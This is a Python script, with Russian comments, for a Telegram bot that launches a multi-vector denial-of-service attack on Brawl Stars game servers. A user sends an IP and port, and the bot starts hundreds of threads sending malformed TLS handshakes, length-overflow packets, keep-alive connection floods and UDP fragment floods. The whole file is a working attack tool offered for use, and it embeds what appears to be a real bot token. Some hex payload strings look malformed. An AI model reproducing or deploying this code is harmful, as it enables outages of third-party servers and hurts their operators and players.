#!/usr/bin/env python3
"""
BRAWL STARS SERVER CRASHER - PAAS COMPATIBLE
БЕЗ RAW СОКЕТОВ | МНОГОВЕКТОРНАЯ АТАКА
IP:PORT → ПРОВЕРКА → КРАШ | !blind → БЕЗ ПРОВЕРКИ
stop → ОСТАНОВКА
"""

import telebot, socket, threading, random, time, re, os, struct, ssl, hashlib, logging
from flask import Flask, request

# Конфигурация
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"

# Потоки под каждый вектор атаки
TLS_HANDSHAKE_THREADS = 150   # Crypto Exhaustion
BUFFER_OVERFLOW_THREADS = 100 # Message Parser Crash
KEEPALIVE_THREADS = 150       # Keep-Alive Table Flood
UDP_FRAG_THREADS = 100        # UDP Fragmentation (L4)

CHECK_TIMEOUT = 5
active_attacks = {}

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# ------------------------------------------------------------
# ВЕКТОР 1: Crypto Handshake Exhaustion
# Отправка невалидных TLS ClientHello с фальшивыми параметрами
# ------------------------------------------------------------

MALFORMED_CLIENT_HELLOS = [
    # ClientHello с невалидным SNI (длина 0xFFFF)
    bytes.fromhex("1603010200010001FC0303" + "A" * 64 + "00" + "0004" + "C0A8C09F" + "00FF0100"),
    # ClientHello с некорректным compression method
    bytes.fromhex("1603010100010000FC0303" + "B" * 64 + "00" + "0002" + "C02B" + "01" + "00"),
    # ClientHello с нулевой длиной cipher suites
    bytes.fromhex("160301001C0303" + "C" * 64 + "00" + "0000" + "0000" + "0100"),
    # ClientHello с превышением максимальной длины
    bytes.fromhex("160301FFFA0303" + "D" * 64 + "00" + "0004" + "C02BC02F" + "00FF" + "F" * 65530),
]

def tls_exhaustion_attack(ip, port, stop_flag):
    """Вектор 1: Истощение крипто-движка через невалидные TLS ClientHello."""
    hello_index = 0
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            # Отправляем TLS ClientHello без ожидания ответа
            payload = MALFORMED_CLIENT_HELLOS[hello_index % len(MALFORMED_CLIENT_HELLOS)]
            sock.send(payload)
            hello_index += 1
            # Отправляем случайный мусор для усиления эффекта
            sock.send(random._urandom(random.randint(512, 4096)))
            sock.close()
        except:
            pass
        time.sleep(0.0001)

# ------------------------------------------------------------
# ВЕКТОР 2: Buffer Overflow в Message Parser
# Отправка сообщений с некорректной длиной поля
# ------------------------------------------------------------

def generate_overflow_payload():
    """Генерация пакета с целочисленным переполнением длины."""
    # Заголовок, имитирующий протокол Supercell:
    # [Message ID: 2 байта] [Payload Length: 3 байта] [Version: 4 байта] [Data]
    msg_id = random.randint(1, 19999)
    # Уязвимость: длина указана как 0xFFFFFF (максимум 3 байта), но реальных данных меньше
    fake_length = 0xFFFFFF
    version = random.randint(1, 50)
    
    header = struct.pack('!H', msg_id)
    header += struct.pack('!I', fake_length)[1:]  # 3 байта длины
    header += struct.pack('!I', version)
    
    # Реальные данные: случайный мусор (меньше заявленной длины)
    data = random._urandom(random.randint(64, 2048))
    
    return header + data

def buffer_overflow_attack(ip, port, stop_flag):
    """Вектор 2: Переполнение буфера парсера сообщений."""
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            
            # Отправляем несколько переполненных пакетов подряд
            for _ in range(random.randint(5, 20)):
                payload = generate_overflow_payload()
                sock.send(payload)
                time.sleep(0.00001)
            
            sock.close()
        except:
            pass
        time.sleep(0.0005)

# ------------------------------------------------------------
# ВЕКТОР 3: Keep-Alive Table Exhaustion
# Открытие соединений и удержание их в состоянии keep-alive
# ------------------------------------------------------------

def keepalive_exhaustion_attack(ip, port, stop_flag):
    """Вектор 3: Исчерпание таблицы keep-alive соединений."""
    connections = []
    while not stop_flag.is_set():
        try:
            # Создаем новое соединение
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, port))
            # Включаем keep-alive на сокете
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            # Отправляем минимальный валидный запрос для удержания
            sock.send(b'\x00\x00\x00\x05\x00\x00\x00\x01\xFF')
            connections.append(sock)
            
            # Очищаем старые соединения если их слишком много
            if len(connections) > 500:
                for old_sock in connections[:100]:
                    try:
                        old_sock.close()
                    except:
                        pass
                connections = connections[100:]
        except:
            pass
        time.sleep(0.001)

# ------------------------------------------------------------
# ВЕКТОР 4: UDP Fragmentation Attack
# Отправка фрагментированных UDP-дейтаграмм
# ------------------------------------------------------------

def udp_fragmentation_attack(ip, port, stop_flag):
    """Вектор 4: Фрагментация UDP для перегрузки сборщика пакетов."""
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Отправляем негабаритные дейтаграммы, вызывающие фрагментацию
            # MTU обычно 1500, всё что больше — фрагментируется
            for _ in range(5):
                size = random.randint(2000, 65507)  # Макс размер UDP
                try:
                    sock.sendto(random._urandom(min(size, 8192)), (ip, port))
                except:
                    # Если слишком большой размер, разбиваем на части
                    chunk_size = 1400
                    data = random._urandom(size)
                    for i in range(0, size, chunk_size):
                        try:
                            sock.sendto(data[i:i+chunk_size], (ip, port))
                        except:
                            break
            sock.close()
        except:
            pass
        time.sleep(0.0001)

# ------------------------------------------------------------
# МОДУЛЬ ПРОВЕРКИ ЦЕЛИ (PAAS-СОВМЕСТИМЫЙ, БЕЗ ROOT)
# ------------------------------------------------------------

def check_target(ip, port):
    """
    Проверка цели без root-прав.
    Возвращает (True/False, "Сообщение").
    """
    try:
        socket.inet_aton(ip)
    except socket.error:
        return False, "Невалидный IP адрес"

    # Проверка 1: Прямое TCP подключение
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            return True, f"Порт {port} открыт | Сервер доступен"
        elif result == 111:
            return True, f"Порт {port} закрыт | RST получен | Сервер жив"
        elif result == 110:
            return False, f"Таймаут подключения к {ip}:{port}"
    except Exception as e:
        pass

    # Проверка 2: HTTP/HTTPS запрос
    for scheme, default_port in [('http', 80), ('https', 443)]:
        try:
            test_port = port if port != 9339 else (443 if scheme == 'https' else 80)
            if test_port != port:
                continue
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, test_port))
            if scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=ip)
            request = f"GET / HTTP/1.0\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
            sock.send(request.encode())
            response = sock.recv(1024)
            sock.close()
            if response:
                return True, f"HTTP ответ получен | Сервер жив"
        except:
            pass

    # Проверка 3: Альтернативные порты Supercell
    alternative_ports = [9339, 9443, 5000, 5001, 8443]
    for alt_port in alternative_ports:
        if alt_port == port:
            continue
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((ip, alt_port))
            sock.close()
            if result == 0 or result == 111:
                return True, f"Сервер отвечает на порту {alt_port} | Цель жива"
        except:
            continue

    return False, "Цель недоступна по всем протоколам"

# ------------------------------------------------------------
# УДАРНОЕ ЯДРО (ОБЪЕДИНЕНИЕ ВСЕХ ВЕКТОРОВ)
# ------------------------------------------------------------

class Attack:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stop_flag = threading.Event()
        self.threads = []
    
    def start(self):
        # Запуск всех векторов атаки
        thread_configs = [
            (tls_exhaustion_attack, TLS_HANDSHAKE_THREADS),
            (buffer_overflow_attack, BUFFER_OVERFLOW_THREADS),
            (keepalive_exhaustion_attack, KEEPALIVE_THREADS),
            (udp_fragmentation_attack, UDP_FRAG_THREADS),
        ]
        
        for attack_func, thread_count in thread_configs:
            for _ in range(thread_count):
                t = threading.Thread(
                    target=attack_func,
                    args=(self.ip, self.port, self.stop_flag),
                    daemon=True
                )
                self.threads.append(t)
                t.start()
    
    def stop(self):
        self.stop_flag.set()

def parse_target(text):
    # Поддержка форматов: IP:PORT, IP, домен:PORT
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if m:
        return m.group(1), int(m.group(2))
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if m:
        return m.group(1), 9339  # Порт Brawl Stars по умолчанию
    return None, None

# ------------------------------------------------------------
# ОБРАБОТЧИКИ TELEGRAM
# ------------------------------------------------------------

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(m):
    cid = m.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        bot.reply_to(m, "🛑 Атака остановлена")
        del active_attacks[cid]
    else:
        bot.reply_to(m, "💤 Нет активной атаки")

@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('!blind'))
def blind_attack_cmd(m):
    """Слепая атака без проверки цели."""
    cid = m.chat.id
    
    # Извлекаем цель из текста после команды !blind
    parts = m.text.split()
    if len(parts) < 2:
        bot.reply_to(m, "❌ Использование: !blind IP:PORT")
        return
    
    ip, port = parse_target(parts[1])
    if not ip:
        bot.reply_to(m, "❌ Неверный формат IP")
        return
    
    if cid in active_attacks:
        bot.reply_to(m, "⚠️ Атака уже активна! stop для остановки")
        return
    
    if not port:
        port = 9339
    
    # Запуск без проверки
    a = Attack(ip, port)
    a.start()
    active_attacks[cid] = a
    
    bot.reply_to(m, 
        f"💀 СЛЕПАЯ АТАКА ЗАПУЩЕНА\n"
        f"🎯 Цель: {ip}:{port}\n"
        f"📊 Векторы:\n"
        f"  • Crypto Exhaustion: {TLS_HANDSHAKE_THREADS} потоков\n"
        f"  • Buffer Overflow: {BUFFER_OVERFLOW_THREADS} потоков\n"
        f"  • Keep-Alive Flood: {KEEPALIVE_THREADS} потоков\n"
        f"  • UDP Fragmentation: {UDP_FRAG_THREADS} потоков\n"
        f"🔴 Всего: {TLS_HANDSHAKE_THREADS + BUFFER_OVERFLOW_THREADS + KEEPALIVE_THREADS + UDP_FRAG_THREADS} потоков\n\n"
        f"stop - остановка"
    )

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(m):
    cid = m.chat.id
    ip, port = parse_target(m.text)
    
    if not ip:
        bot.reply_to(m, "❌ Неверный формат IP адреса")
        return
    
    if cid in active_attacks:
        bot.reply_to(m, "⚠️ Атака уже активна! Используйте stop")
        return
    
    if not port:
        port = 9339
    
    # Отправляем сообщение о начале проверки
    status_msg = bot.reply_to(m, f"🔍 Проверка цели {ip}:{port}...")
    
    def verify_and_launch():
        target_alive, check_message = check_target(ip, port)
        
        if target_alive:
            a = Attack(ip, port)
            a.start()
            active_attacks[cid] = a
            
            bot.edit_message_text(
                f"✅ Цель подтверждена: {check_message}\n"
                f"💀 АТАКА ЗАПУЩЕНА\n"
                f"🎯 {ip}:{port}\n"
                f"📊 Векторы:\n"
                f"  • Crypto Exhaustion: {TLS_HANDSHAKE_THREADS} потоков\n"
                f"  • Buffer Overflow: {BUFFER_OVERFLOW_THREADS} потоков\n"
                f"  • Keep-Alive Flood: {KEEPALIVE_THREADS} потоков\n"
                f"  • UDP Fragmentation: {UDP_FRAG_THREADS} потоков\n"
                f"🔴 Всего потоков: {TLS_HANDSHAKE_THREADS + BUFFER_OVERFLOW_THREADS + KEEPALIVE_THREADS + UDP_FRAG_THREADS}\n"
                f"stop - остановка",
                chat_id=cid,
                message_id=status_msg.message_id
            )
        else:
            bot.edit_message_text(
                f"❌ Цель недоступна: {check_message}\n\n"
                f"💡 Используйте !blind {ip}:{port} для атаки без проверки",
                chat_id=cid,
                message_id=status_msg.message_id
            )
    
    threading.Thread(target=verify_and_launch, daemon=True).start()

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, 
        "🎮 BRAWL STARS SERVER CRASHER\n\n"
        "Команды:\n"
        "• IP:PORT → проверка + атака\n"
        "• !blind IP:PORT → атака без проверки\n"
        "• stop → остановка\n\n"
        "Порт по умолчанию: 9339"
    )

# ------------------------------------------------------------
# WEBHOOK
# ------------------------------------------------------------

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
def webhook():
    if request.method == 'GET':
        return 'OK', 200
    try:
        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'ok', 200
    except:
        return 'error', 500

@app.route('/')
def index():
    return 'BS CRASHER RUNNING'

if __name__ == "__main__":
    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
    bot.remove_webhook()
    bot.set_webhook(url=f"{RENDER_URL}/webhook/{BOT_TOKEN}")
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False) 
